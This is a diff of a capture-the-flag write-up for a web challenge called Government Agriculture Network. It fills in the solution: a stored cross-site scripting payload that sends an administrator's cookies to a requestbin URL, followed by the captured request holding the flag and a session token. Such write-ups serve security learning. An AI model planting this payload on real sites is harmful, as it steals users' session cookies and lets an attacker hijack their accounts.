@@ -1,6 +1,6 @@
 # Government Agriculture Network
 
-## Description
+## Descrption
 
 Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet,
 posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the
@@ -16,11 +16,26 @@ knowing. You must meet this entity! Converse and convince them you're meant to b
 picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop
 this from happening. Get more information about this Gubberment thing and stop this atrocity.
 
-You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's host to rescue
-it.
+You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to
+rescue it.
 
 [https://govagriculture.web.ctfcompetition.com/](https://govagriculture.web.ctfcompetition.com/)
 
 ## Solution
 
-TODO
+On the Ministry of Agriculture site we create new posts which are reviewed by an administrator. From this we can guess
+that we must steal their cookie. The following payload sends the cookies to our site:
+
+```js
+<script>
+document.location='http://requestbin.net/r/18cbjfi1?c=' + document.cookie;
+</script>
+```
+
+The requestbin showed the following request:
+
+```
+GET /r/18cbjfi1?c=flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
+```
+
+Therefore the flag was `CTF{8aaa2f34b392b415601804c2f5f0f24e}`
